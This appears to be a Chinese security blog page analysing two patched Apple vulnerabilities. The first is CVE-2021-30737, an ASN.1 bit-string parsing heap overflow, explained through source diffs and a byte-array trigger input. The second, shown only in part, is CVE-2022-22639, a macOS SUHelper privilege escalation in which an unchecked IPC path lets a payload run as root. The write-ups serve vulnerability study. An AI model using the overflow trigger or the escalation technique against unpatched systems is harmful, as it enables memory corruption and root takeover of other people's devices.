<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTR4nwonetxF1WHDpaUkJme_Ywz-VWc63Qy1j2PJJrAWN0Z7Drcal63h6umti0HFcEaAFlCIH8lmFFGTXkdRsrJ1fAtyzNCAw9c1alni0EPXiAHuRLDBsn0b0FcRRGOzH14wqaOueV_ThhnOWLhuJJbllQChJGfRY5i8VOIEoXsmYOgT4NEfgbs_l_4A/s600/image3%20%281%29.png" alt="An outer constructed definite length string with three children: a primitive string &quot;abc&quot;, a constructed indefinite length string and a primitive string &quot;ghi&quot;. The constructed indefinite string has two children, a primitive string &quot;def&quot; and an end-of-contents marker."></p>
<p>我们从一个构建好的确定长度的字符串开始。这个字符串的长度值L是构成这个字符串的剩余输入的完整大小；这个数量的输入字节应该被解析为子串，并连接起来形成解析后的输出。</p>
<p>在这一点上，NSS ASN.1字符串解析器使用该第一个输入字符串的长度L，为解析后的输出字符串分配输出缓冲区。这个缓冲区是一个过度分配的最坏情况。但真正有趣的部分是，NSS分配了输出缓冲区，然后立即扔掉了这个长度！这一点在快速浏览代码时可能不是那么明显。被分配的缓冲区被存储为缓冲区封装类型的Data字段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cssm_data</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> Length;</span><br><span class="line">    <span class="type">uint8_t</span> * __nullable Data;</span><br><span class="line">&#125; SecAsn1Item, SecAsn1Oid;</span><br></pre></td></tr></table></figure>

<p>Length字段不是分配的Data缓冲区的大小。它是一个（特定类型的）计数，决定了Data所指向的缓冲区有多少比特或字节是有效的。(CVE-2016-1950是NSS中的一个错误，代码混淆了这些单位。)</p>
<p>与其将分配的缓冲区大小与缓冲区指针一起存储，不如在每次遇到子串时，解析器在当前正在解析的状态堆栈中往上走，找到最里面的确定长度的字符串。当它向上查询的时候，会检查每个状态，以确定它已经消耗了多少输入，以便能够确定当前要解析的子串是否完全被包围在最内层的定长字符串中。如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">sec_asn1d_state *parent = sec_asn1d_get_enclosing_construct(state);</span><br><span class="line"><span class="keyword">while</span> (parent &amp;&amp; parent-&gt;indefinite) &#123;</span><br><span class="line">  parent = sec_asn1d_get_enclosing_construct(parent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> remaining = parent-&gt;pending;</span><br><span class="line">parent = state;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!sec_asn1d_check_and_subtract_length(&amp;remaining,</span><br><span class="line">                                           parent-&gt;consumed,</span><br><span class="line">                                           state-&gt;top)</span><br><span class="line">      ||</span><br><span class="line">      <span class="comment">/* If parent-&gt;indefinite is true, parent-&gt;contents_length is</span></span><br><span class="line"><span class="comment">       * zero and this is a no-op. */</span></span><br><span class="line">      !sec_asn1d_check_and_subtract_length(&amp;remaining,</span><br><span class="line">                                           parent-&gt;contents_length,</span><br><span class="line">                                           state-&gt;top)</span><br><span class="line">      ||</span><br><span class="line">      <span class="comment">/* If parent-&gt;indefinite is true, then ensure there is enough</span></span><br><span class="line"><span class="comment">       * space for an EOC tag of 2 bytes. */</span></span><br><span class="line">      (  parent-&gt;indefinite</span><br><span class="line">          &amp;&amp;</span><br><span class="line">          !sec_asn1d_check_and_subtract_length(&amp;remaining,</span><br><span class="line">                                               <span class="number">2</span>,</span><br><span class="line">                                               state-&gt;top)</span><br><span class="line">      )</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="comment">/* This element is larger than its enclosing element, which is</span></span><br><span class="line"><span class="comment">       * invalid. */</span></span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> ((parent = sec_asn1d_get_enclosing_construct(parent))</span><br><span class="line">         &amp;&amp;</span><br><span class="line">         parent-&gt;indefinite);</span><br></pre></td></tr></table></figure>

<p>首先沿着状态栈向上走，找到最内层构建的确定状态，并使用其状态&gt;待定值作为上限。然后，再走一遍状态栈，对于每一个中间状态，从原来的挂起值中减去那些中间状态可能消耗的字节数。很明显，待定值是非常重要的；它被用来确定一个上限，所以如果我们把它弄乱了，这个 “边界检查 “就会出错。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>漏洞位于<code>sec_asn1d_parse_bit_string</code>中，包含 ASN.1 解析器的 MacOS 11.4 和 11.3 版本的<a target="_blank" rel="noopener" href="https://opensource.apple.com/source/Security/Security-59754.120.12/OSX/libsecurity_asn1/lib/secasn1d.c.auto.html">secasn1d.c之间的差异：</a></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/OSX/libsecurity_asn1/lib/secasn1d.c b/OSX/libsecurity_asn1/lib/secasn1d.c</span></span><br><span class="line"><span class="comment">index f338527..5b4915a 100644</span></span><br><span class="line"><span class="comment">--- a/OSX/libsecurity_asn1/lib/secasn1d.c</span></span><br><span class="line"><span class="comment">+++ b/OSX/libsecurity_asn1/lib/secasn1d.c</span></span><br><span class="line"><span class="meta">@@ -434,9 +434,6 @@</span> loser:</span><br><span class="line">         PORT_ArenaRelease(cx-&gt;our_pool, state-&gt;our_mark);</span><br><span class="line">         state-&gt;our_mark = NULL;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="deletion">-    if (new_state != NULL) &#123;</span></span><br><span class="line"><span class="deletion">-        PORT_Free(new_state);</span></span><br><span class="line"><span class="deletion">-    &#125;</span></span><br><span class="line">     return NULL;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@@ -1794,19 +1791,13 @@</span> sec_asn1d_parse_bit_string (sec_asn1d_state *state,</span><br><span class="line">     /*PORT_Assert (state-&gt;pending &gt; 0); */</span><br><span class="line">     PORT_Assert (state-&gt;place == beforeBitString);</span><br><span class="line"><span class="deletion">-    if ((state-&gt;pending == 0) || (state-&gt;contents_length == 1)) &#123;</span></span><br><span class="line"><span class="addition">+    if (state-&gt;pending == 0) &#123;</span></span><br><span class="line">                if (state-&gt;dest != NULL) &#123;</span><br><span class="line">                        SecAsn1Item *item = (SecAsn1Item *)(state-&gt;dest);</span><br><span class="line">                        item-&gt;Data = NULL;</span><br><span class="line">                        item-&gt;Length = 0;</span><br><span class="line">                        state-&gt;place = beforeEndOfContents;</span><br><span class="line"><span class="deletion">-               &#125;</span></span><br><span class="line"><span class="deletion">-               if(state-&gt;contents_length == 1) &#123;</span></span><br><span class="line"><span class="deletion">-                       /* skip over (unused) remainder byte */</span></span><br><span class="line"><span class="deletion">-                       return 1;</span></span><br><span class="line"><span class="deletion">-               &#125;</span></span><br><span class="line"><span class="deletion">-               else &#123;</span></span><br><span class="line"><span class="deletion">-                       return 0;</span></span><br><span class="line"><span class="addition">+            return 0;</span></span><br><span class="line">                &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>在确定边界检查可能会出问题以后，看一下<code>sec_asn1d_parse_bit_string</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">sec_asn1d_parse_bit_string</span> <span class="params">(sec_asn1d_state *state, <span class="type">const</span> <span class="type">char</span> *buf, <span class="type">unsigned</span> <span class="type">long</span> len)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*PORT_Assert (state-&gt;pending &gt; 0); */</span></span><br><span class="line">    PORT_Assert (state-&gt;place == beforeBitString);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ((state-&gt;pending == <span class="number">0</span>) || $(state-&gt;contents_length == <span class="number">1</span>)$) &#123;</span><br><span class="line">        <span class="keyword">if</span> (state-&gt;dest != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            SecAsn1Item *item = (SecAsn1Item *)(state-&gt;dest);</span><br><span class="line">            item-&gt;Data = <span class="literal">NULL</span>;</span><br><span class="line">            item-&gt;Length = <span class="number">0</span>;</span><br><span class="line">            state-&gt;place = beforeEndOfContents;</span><br><span class="line">        &#125;</span><br><span class="line">				</span><br><span class="line">        $ <span class="keyword">if</span>(state-&gt;contents_length == <span class="number">1</span>) &#123;</span><br><span class="line">        $     <span class="comment">/* skip over (unused) remainder byte */</span></span><br><span class="line">        $     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        $ &#125;</span><br><span class="line">        $ <span class="keyword">else</span> &#123;</span><br><span class="line">        $     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        $ &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        state-&gt;top-&gt;status = needBytes;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    byte = (<span class="type">unsigned</span> <span class="type">char</span>) *buf;</span><br><span class="line">    <span class="keyword">if</span> (byte &gt; <span class="number">7</span>) &#123;</span><br><span class="line">        dprintf(<span class="string">&quot;decodeError: parse_bit_string remainder oflow\n&quot;</span>);</span><br><span class="line">        PORT_SetError (SEC_ERROR_BAD_DER);</span><br><span class="line">        state-&gt;top-&gt;status = decodeError;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    state-&gt;bit_string_unused_bits = byte;</span><br><span class="line">    state-&gt;place = duringBitString;</span><br><span class="line">    state-&gt;pending -= <span class="number">1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$注释的区域是被补丁删除的部分。这个函数的目的是返回它所消耗的输入字节数（由buf指向），我最初的直觉是注意到补丁删除了一个通过这个函数的路径，在那里你可以得到所消耗的输入字节数和待定字节数的同步。应该是这样的，当他们在被删除的代码中返回1时，他们也会递减state&gt;pending，就像他们在该函数返回1的其他地方所做的那样。</p>
<p>达到这个状态时，buf指向一个原始位串的长度值之后的第一个字节。state&gt;contents_length是这个解析后的长度值。正如前面所讨论的，位串是一种独特的ASN.1字符串类型，因为它们在开头有一个额外的元数据字节（未使用的位数字节）。有一个明确的零长度的字符串是完全可以的–事实上，这在prepareForContents状态中已经（有点）提前处理了，它直接短路到afterEndOfContents。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (state-&gt;contents_length == <span class="number">0</span> &amp;&amp; (! state-&gt;indefinite)) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * A zero-length simple or constructed string; we are done.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  state-&gt;place = afterEndOfContents;</span><br></pre></td></tr></table></figure>

<p>这里他们检测的是一个内容长度为0的确定长度的字符串类型。但这并没有处理一个只由未使用的位数字节组成的位串的边缘情况。该位串的state&gt;contents_length值将是1，但它实际上没有任何 内容。</p>
<p>sec_asn1d_parse_bit_string中的(state&gt;contents_length &#x3D;&#x3D; 1)条件正是符合这种情况。</p>
<p>通过将state&gt;place设置为beforeEndOfContents，他们再次试图绕过状态机，跳到字符串内容被消耗后的状态。但在这里，他们采取了一个额外的步骤，而在prepareForContents中他们并没有采取同样的步骤。除了更新state&gt;place之外，他们还把目的地SecAsn1Item的Data字段空出来，并把Length设置为0。</p>
<p>前面提到，为递归解析构建的字符串的子字符串而分配的新子状态得到了父状态的dest字段的副本（它是一个指向输出缓冲区的指针）。(从技术上讲，如果最外层的字符串是无限长的，实际上不是这样的，对这种情况有单独的处理，而是建立一个子字符串的链接列表，最终被连接起来，见sec_asn1d_concat_substrings)。</p>
<p>如果输出缓冲区只分配一次，那么如果你像这里一样将数据设置为NULL会怎样？退一步讲，这实际上有任何意义吗？</p>
<p>不，我不认为这有任何意义。在这一点上，将Data设置为NULL至少会导致内存泄漏，因为它是输出缓冲区的唯一指针。</p>
<p>但有趣的是，这并不是将该指针设为NULL的唯一后果， item-&gt;Data被用来发出其他信号。</p>
<p>下面是prepare_for_contents的一个片段，当它确定输出缓冲区中是否有足够的空间给这个子串时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (state-&gt;substring) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * If we are a substring of a constructed string, then we may</span></span><br><span class="line"><span class="comment">   * not have to allocate anything (because our parent, the</span></span><br><span class="line"><span class="comment">   * actual constructed string, did it for us).  If we are a</span></span><br><span class="line"><span class="comment">   * substring and we *do* have to allocate, that means our</span></span><br><span class="line"><span class="comment">   * parent is an indefinite-length, so we allocate from our pool;</span></span><br><span class="line"><span class="comment">   * later our parent will copy our string into the aggregated</span></span><br><span class="line"><span class="comment">   * whole and free our pool allocation.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (item-&gt;Data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    PORT_Assert (item-&gt;Length == <span class="number">0</span>);</span><br><span class="line">    poolp = state-&gt;top-&gt;our_pool;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    alloc_len = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>如果此时 item-&gt;Data 是 NULL，state&gt;substring 是真的，那么一定是他们目前正在解析一个外层不确定字符串的子串，这个字符串没有已经分配的确定大小的缓冲区。在这种情况下，item-&gt;Data指针的含义与我们前面描述的不同：它只是一个临时缓冲区，目的是只容纳这个子串。就在上面，alloc_len被设置为这个子串的内容长度；对于外部定义长度的情况，至关重要的是alloc_len在这里被设置为0（这实际上是表明一个缓冲区已经被分配了，他们必须不分配一个新的。）</p>
<p>为了强调这个潜在的微妙之处：问题在于，使用这个连词（state&gt;substring &amp;&amp; !item-&gt;Data）来确定这是一个确定长度的子串还是外层不确定的字符串，与我们前面看到的复杂的边界检查代码所使用的方法不同。那个方法是沿着当前状态堆栈向上走，检查超字符串的不定位，以确定它们是否在处理一个外层不定字符串的子串。</p>
<p>假设我们有一个外层定长构造的比特串，有三个原始比特串作为子串。</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJrFict8RB7ceuAnNar7zlVvCo6pD9Li2Pbf3LJneP7BuRb9W7ZDtn-QMp4oofVurZqXctrbIJy_qXQ_NmvyteSEoqOeXmuk2W2JqrWl7_bIyKZk3C7HuN5zv3rLmT6fX5BZjoQAdAm_PQHl8b2xvEPFAAD9IP-WFKJcgzh_n_Sg5FZAZsT0FcHu5-tw/s600/image5%20%281%29.png" alt="img"></p>
<p>在遇到第一个最外层的确定长度的比特串时，代码将分配一个固定大小的缓冲区，其大小足以存储构成这个字符串的所有剩余输入，在本例中是42字节。在这一点上，dest-&gt;Data指向该缓冲区。</p>
<p>然后他们分配一个子状态，获得dest指针的拷贝（不是dest SecAsn1Item对象的拷贝；是指向它的指针的拷贝），并继续解析第一个子字符串。</p>
<p>这是一个长度为1的原始位串，它触发了sec_asn1d_parse_bit_string中的脆弱路径并将dest-&gt;Data设置为NULL。状态机跳转到beforeEndOfContents，然后最终下一个子串被解析–这次dest-&gt;Data &#x3D;&#x3D; NULL。</p>
<p>现在逻辑出了问题，正如我们在上面的片段中看到的，一个新的dest-&gt;Data缓冲区被分配，其大小只有这个子串（2字节），而事实上dest-&gt;Data应该已经指向一个足够大的缓冲区来容纳整个外层不确定的输入字符串。然后，这个子串的内容被解析并复制到该缓冲区。</p>
<p>现在我们来到了第三个子串。 dest-&gt;Data不再是NULL；但是代码现在没有办法确定缓冲区实际上只是（错误地）被分配来容纳一个子串。它相信 item-&gt;Data 只被分配一次的不变性，当遇到第一个外层确定长度的字符串时，它仅用这个事实来确定 dest-&gt;Data 是否指向一个足够大的缓冲区，以便将这个子串追加到其中。然后它很高兴地追加了这第三个子串，在分配给只存储第二个子串的缓冲区的范围之外写入。</p>
<p><strong>这里有一个很好的内存破坏原语：可以造成一个受控大小的分配，然后用任意数量的任意字节溢出它们。</strong></p>
<p>触发的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> concat_bitstrings_constructed_definite_with_zero_len_realloc[]</span><br><span class="line">     = &#123;ASN1_CLASS_UNIVERSAL | ASN1_CONSTRUCTED | ASN1_BIT_STRING, <span class="comment">// (0x23)</span></span><br><span class="line">        <span class="number">0x4a</span>, <span class="comment">// initial allocation size</span></span><br><span class="line">        ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING,</span><br><span class="line">        <span class="number">0x1</span>, <span class="comment">// force item-&gt;Data = NULL</span></span><br><span class="line">        <span class="number">0x0</span>, <span class="comment">// number of unused bits in the final byte</span></span><br><span class="line">        ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING,</span><br><span class="line">        <span class="number">0x2</span>, <span class="comment">// this is the reallocation size</span></span><br><span class="line">        <span class="number">0x0</span>, <span class="comment">// number of unused bits in the final byte</span></span><br><span class="line">        <span class="number">0xff</span>, <span class="comment">// only byte of bitstring</span></span><br><span class="line">        ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING,</span><br><span class="line">        <span class="number">0x41</span>, <span class="comment">// 64 actual bytes, plus the remainder, will cause 0x40 byte memcpy one byte in to 2 byte allocation</span></span><br><span class="line">        <span class="number">0x0</span>, <span class="comment">// number of unused bits in the final byte</span></span><br><span class="line">        <span class="number">0xff</span>,</span><br><span class="line">        <span class="number">0xff</span>,<span class="comment">// -- continues for overflow</span></span><br></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html?m=1">https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html?m=1</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/09/MacOS-SUHelper%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2022-22639/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/09/MacOS-SUHelper%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-CVE-2022-22639/" class="post-title-link" itemprop="url">MacOS SUHelper提权漏洞(CVE-2022-22639)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-09 09:41:01" itemprop="dateCreated datePublished" datetime="2022-04-09T09:41:01+08:00">2022-04-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-10 17:49:47" itemprop="dateModified" datetime="2022-04-10T17:49:47+08:00">2022-04-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CVE-2022-22639 在iOS 15.4 、iPadOS 15.4、macOS Monterey 12.3上进行了修复。</p>
<p>也影响了iOS，是由<a target="_blank" rel="noopener" href="https://www.trendmicro.com/en_us/research/22/d/macos-suhelper-root-privilege-escalation-vulnerability-a-deep-di.html">trend micro</a>发现的。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><code>suhelpd</code>是macOS中软件更新的辅助守护进程，其中有一个类叫SUHelper，使用IPC提供系统服务。这个进程以root身份运行，并使用特殊权利进行签名，如<code>com.apple.rootless.install</code>。<code>suhelpd</code>可以授予进程绕过系统完整性保护(SIP)限制的能力。</p>
<h2 id="IPC服务"><a href="#IPC服务" class="headerlink" title="IPC服务"></a>IPC服务</h2><p><code>suhelpd</code>通过<code>bootstrap_check_in</code>注册名为<code>com.apple.suhelperd</code>的IPC服务。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/202204091356.png" alt="202204091356" style="zoom: 50%;" />

<p>IPC 服务器提供了 45 个服务例程，但是不知道是怎么逆向出来的。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper02.png" alt="图 2. 一些 IPC 服务例程"></p>
<p>调用这些服务例程，可以使用OC提供的SUHelperProxy 的类，它封装了所有可以直接使用的 IPC 客户端接口，后面exp也是利用这个来写的。 </p>
<h2 id="客户端授权"><a href="#客户端授权" class="headerlink" title="客户端授权"></a>客户端授权</h2><p>这 45 种服务有一部分可供非特权客户端使用，并且服务器可以通过权限授权机制来验证服务请求是否来自合法客户端。 </p>
<p>客户端需要通过 API <code>AuthorizationCreate</code> 生成一个授权对象，然后将其作为外部表单（32 字节数据），将授权对象传递给服务器进行验证。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper05.png" alt="图 5. 生成授权对象的客户端"></p>
<p>服务器收到授权对象后，判断是否可以授予客户端特定的权限。在这个阶段，服务器检查客户端的授权对象和uid。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper06.png" alt="图 6. 服务器验证客户端的授权对象和 uid"></p>
<p>当客户端请求一个特殊的服务例程时，服务器检查特定的权限是否先前被授予给客户端，否则拒绝该请求。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>以此逆向分析 45 个服务例程，然后过滤掉带有验证码的那些，发现了一些名称以“IPC_0_”开头的。对这些例程再进行逆向，发现函数<code>-[SUHelper prepareInstallAssistantWithPath:(NSString *) path]</code>是可利用的。调用者函数 <code>IPC_0_prepareInstallAssistantWithPath</code> 没有验证客户端的权限，而是直接调用了真实的例程。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper11.png" alt="图 11. 易受攻击的 IPC 服务例程"></p>
<p>函数的实现如下，第三个参数<code>(NSString *)</code>是从客户端传过来的路径。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper12.png" alt="图 12. 函数“–[SUHelper prepareInstallAssitantWithPath:]”的实现"></p>
<p>查看内部函数会发现它在第 70 行加载了一个包。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper13.png" alt="图 13. 内部函数实现"></p>
<p>调试发现捆绑路径为 <code>$&#123;Assistant.app&#125;/Contents/Frameworks/OSInstallerSetup.framework</code>。一个重要的发现是<code>$&#123;Assistant.app&#125;</code>其实是第三个参数<code>(NSString *)</code>路径，可以完全由客户端控制。</p>
<p>在正常情况下，<code>$&#123;Assistant.app&#125;</code>应该是安装<code>macOS XXX.app</code>的真实路径。是从 Apple 服务器下载的 <code>InstallAssistant.pkg</code> 中提取的。但是，我发现用户可以利用此漏洞伪造 <code>$&#123;Assistant.app&#125;</code> 的路径和内容。</p>
<p>似乎找到了一个将任何 dylib 加载到目标进程中以获得 root 特权和特殊权利的原语。但是，无法直接加载自签名 dylib，因为当 SIP 开启时，系统进程默认启用<a target="_blank" rel="noopener" href="https://developer.apple.com/documentation/security/hardened_runtime?language=objc">强化运行</a>时，即使它没有使用运行时标志进行签名。但可以将任意 Apple 签名的 dylib 加载到其中，即使它是一个旧的、易受攻击的 dylib。</p>
<p>还有另一个办法，让它加载原始的 <code>OSInstallerSetup.framework</code>。一旦 <code>OSInstallerSetup.framework</code> 被加载，它就会调用函数<code>-[OSISClient _startServer]</code>。在第 103 行，它通过 API <code>SMJobSubmit</code> 启动另一个 IPC 服务 <code>com.apple.install.osinstallersetupd</code>。从第 48 行可以看出，如果当前进程以 root 身份运行，那么新提交的作业也以 root 权限运行在系统域。 </p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper14.png" alt="图 14. 函数“–[OSISClient _startServer]”的实现"></p>
<p>当前进程是 <code>suhelperd</code>，以 root 身份运行，作业可执行路径是 <code>toolPath</code>，它位于包 <code>$&#123;Assistant.app&#125;/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd</code> 内。攻击者可以将payload直接放入 <code>toolPath</code> 以实现 root 权限升级。</p>
<p><img src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/d/suhelper/suhelper15.png" alt="图 15. 如何获取 toolPath"></p>
